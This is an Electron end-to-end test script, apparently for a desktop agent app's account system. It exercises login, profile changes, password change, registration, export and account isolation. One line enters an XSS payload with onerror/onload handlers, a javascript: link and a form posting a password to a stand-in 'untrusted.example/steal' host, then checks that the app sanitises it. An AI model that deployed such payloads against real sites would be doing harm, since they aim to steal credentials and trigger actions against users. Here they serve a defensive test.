const {app,BrowserWindow,ipcMain,safeStorage}=require('electron')
const fs=require('node:fs'),path=require('node:path'),assert=require('node:assert/strict'),{randomUUID}=require('node:crypto')
const {installLoginVault}=require('../electron/login-vault.cjs')
const root=path.resolve(__dirname,'..'),runtime=path.resolve(root,'../agent-server/.runtime'),fixtureFile=path.join(runtime,'accounts-validation.json')
const data=JSON.parse(fs.readFileSync(fixtureFile,'utf8')),label=process.argv.includes('--packaged')?'packaged':'source',base=data.base
assert.equal(new URL(base).port,'18080','UI validation must use isolated backend')
const userData=path.join(runtime,'accounts-ui-'+label);fs.mkdirSync(userData,{recursive:true});app.setPath('userData',userData);app.disableHardwareAcceleration()
try{fs.unlinkSync(path.join(userData,'account-session.bin'))}catch(error){if(error.code!=='ENOENT')throw error}
installLoginVault({app,ipcMain,safeStorage,BrowserWindow,apiBase:base,registrationKeyFile:data.registrationKeyFile});ipcMain.on('agentops:notify',()=>{});ipcMain.on('agentops:theme',()=>{})
app.whenReady().then(async()=>{let win
 try{
  const archive=label==='source'?root:path.join(root,'release/win-unpacked/resources/app.asar')
  let streamAuthenticated=false,downloaded=false
  win=new BrowserWindow({show:false,width:1440,height:1000,webPreferences:{preload:path.join(archive,'electron/preload.cjs'),additionalArguments:['--agent-api-base='+base],offscreen:true,backgroundThrottling:false}})
  win.webContents.session.webRequest.onBeforeSendHeaders({urls:[base+'/api/runs/*/events*']},(details,callback)=>{
   assert.doesNotMatch(details.url,/tenantId|userId|token/);streamAuthenticated=Object.keys(details.requestHeaders).some(k=>k.toLowerCase()==='authorization'&&details.requestHeaders[k].startsWith('Bearer '));callback({requestHeaders:details.requestHeaders})
  })
  const exportFile=path.join(runtime,'accounts-ui-export-'+label+'.md')
  win.webContents.session.on('will-download',(_event,item)=>{item.setSavePath(exportFile);item.once('done',(_e,state)=>{downloaded=state==='completed'})})
  const js=code=>win.webContents.executeJavaScript('(async()=>{'+code+'})()')
  async function wait(condition){const end=Date.now()+45000;while(Date.now()<end){if(await js('return Boolean('+condition+')'))return;await new Promise(resolve=>setTimeout(resolve,100))}throw Error('UI condition timed out: '+condition)}
  async function click(selector){await wait('document.querySelector('+JSON.stringify(selector)+')');await js('document.querySelector('+JSON.stringify(selector)+').click()')}
  async function fill(selector,value){await wait('document.querySelector('+JSON.stringify(selector)+')');await js('const el=document.querySelector('+JSON.stringify(selector)+');el.value='+JSON.stringify(value)+';el.dispatchEvent(new Event("input",{bubbles:true}))')}
  async function signIn(password){await wait('document.querySelector("#account-username")');await fill('#account-username',data.username);await fill('#account-password',password);await click('.account-submit');await wait('document.querySelector(".shell")')}
  async function openProfile(section){await click('.profile-main');await wait('document.querySelector(".profile-dialog")');if(section){await js('Array.from(document.querySelectorAll(".profile-layout nav button")).find(b=>b.textContent.includes('+JSON.stringify(section)+')).click()');await wait('document.querySelector(".profile-content h3")?.textContent==='+JSON.stringify(section))}}
  await win.loadFile(path.join(archive,'dist/index.html'));await wait('document.querySelector("#account-username")')
  fs.writeFileSync(path.join(runtime,'accounts-login-'+label+'.png'),(await win.webContents.capturePage()).toPNG())
  await fill('#account-username',data.username);await fill('#account-password','incorrect-password');await click('.account-submit');await wait('document.querySelector(".account-error")')
  await signIn(data.password)
  await openProfile();assert.equal(await js('return document.querySelector("#profile-tenant")'),null)
  const display='个人中心 '+label
  await fill('#profile-name',display);await click('.profile-content form button[type=submit]');await wait('document.querySelector(".profile-success")')
  assert.ok((await js('return document.querySelector(".profile-main").textContent')).includes(display))
  fs.writeFileSync(path.join(runtime,'accounts-profile-'+label+'.png'),(await win.webContents.capturePage()).toPNG())
  await click('[aria-label="关闭个人设置"]')
  await js('sessionStorage.clear()');await new Promise(resolve=>{win.webContents.once('did-finish-load',resolve);win.reload()});await wait('document.querySelector(".shell")')
  assert.ok((await js('return document.querySelector(".profile-main").textContent')).includes(display))
  await click('.new-chat');await wait('document.querySelector(".session-item.on")&&document.querySelector(".composer textarea")&&!document.querySelector(".composer textarea").disabled')
  const attack='<img src="http://127.0.0.1:18080/api/auth/logout" onerror="window.__attack=true"><form action="https://untrusted.example/steal"><input name=password></form><svg onload="window.__attack=true"></svg><a href="javascript:alert(1)">bad</a><span style="position:fixed">你好，简单介绍你能做什么。</span>'
  await fill('.composer textarea',attack);await click('.send')
  await wait('document.querySelector(".task-final-answer .msg-body")')
  assert.equal(await js('return Boolean(window.__attack)'),false)
  assert.equal(await js('return document.querySelector(".msg-user .msg-body")?.querySelectorAll("script,form,input,svg,[style],[onerror],img[src],a[href^=javascript]").length'),0)
  await js('Object.defineProperty(navigator,"clipboard",{configurable:true,value:{writeText:async text=>{window.__copied=text}}})')
  await click('.answer-actions button');assert.ok((await js('return window.__copied')).length>5)
  await click('.conversation-export');const end=Date.now()+15000;while(!downloaded&&Date.now()<end)await new Promise(r=>setTimeout(r,100));assert.ok(downloaded);assert.ok(fs.readFileSync(exportFile,'utf8').includes('你好'))
  assert.ok(streamAuthenticated,'live task must authenticate the SSE request')
  await openProfile('账号安全');await wait('document.querySelectorAll(".device").length>0')
  fs.writeFileSync(path.join(runtime,'accounts-security-'+label+'.png'),(await win.webContents.capturePage()).toPNG())
  const newPassword='UI-'+randomUUID()
  await fill('#current-password',data.password);await fill('#new-password',newPassword);await fill('#confirm-new-password','not-matching-password')
  await click('.profile-content section form button[type=submit]');await wait('document.querySelector(".profile-error")');assert.ok((await js('return document.querySelector(".profile-error").textContent')).includes('不一致'))
  await fill('#confirm-new-password',newPassword);await click('.profile-content section form button[type=submit]');await wait('document.querySelector("#account-username")')
  await signIn(newPassword);data.password=newPassword;fs.writeFileSync(fixtureFile,JSON.stringify(data,null,2))
  await openProfile();await click('.profile-layout nav .logout');await wait('document.querySelector("#account-username")')
  // Exercise registration in the real UI; a separate account must see an empty workspace.
  await click('.account-switch button');await wait('document.querySelector("#account-name")')
  await fill('#account-username','ui_'+randomUUID().slice(0,8));await fill('#account-name','新用户');await fill('#account-password','New-'+randomUUID());
  const password=await js('return document.querySelector("#account-password").value');await fill('#account-confirm',password)
  await click('.account-submit');await wait('document.querySelector(".shell")');assert.equal(await js('return document.querySelectorAll("[data-session-id]").length'),0)
  const result={passed:true,label,registration:true,login:true,profileSaved:true,encryptedAutoLogin:true,passwordChanged:true,sessionDevices:true,conversationExported:true,answerCopied:true,authenticatedStreaming:true,accountIsolation:true,xssBlocked:true,externalImagesBlocked:true}
  fs.writeFileSync(path.join(runtime,'accounts-ui-'+label+'.json'),JSON.stringify(result,null,2));console.log(JSON.stringify(result));win.destroy();app.exit(0)
 }catch(error){console.error(error.stack);if(win&&!win.isDestroyed()){fs.writeFileSync(path.join(runtime,'accounts-ui-failed-'+label+'.png'),(await win.webContents.capturePage()).toPNG());win.destroy()}app.exit(1)}
})
